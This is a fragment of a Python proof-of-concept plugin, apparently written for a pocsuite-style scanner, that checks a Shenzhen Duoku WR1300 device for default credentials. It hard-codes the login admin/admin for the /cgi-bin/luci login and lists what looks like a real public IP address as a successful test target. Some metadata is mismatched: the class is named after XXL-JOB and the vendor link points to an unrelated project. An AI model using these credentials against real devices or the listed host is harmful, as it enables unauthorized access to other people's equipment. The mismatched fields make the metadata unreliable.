...
class XXLJOBPOC(POCBase):
    ...
    name = "深圳市多酷科技WR1300设备存在默认口令漏洞 PoC"  # PoC 名称
    appPowerLink = "https://github.com/alibaba/canal/wiki"  # 漏洞厂商主页地址
    appName = "深圳市多酷科技WR1300设备"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://170.55.165.232:8443/"]  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
               深圳市多酷科技WR1300设备后台系统默认弱口令,攻击者可以直接通过默认口令登录后台进行敏感操作
           """  # 漏洞简要描述
    pocDesc = """
               admin/admin
           """  # POC用法描述
    ...
    def _check(self):
        ...
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                         ...
                         "Referer": f"{self.url}/cgi-bin/luci", "Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        data = {"timeclock": "1658069885", "luci_language": "auto", "luci_username": "admin",
                      "luci_password": "admin"}
        result = []
        try:
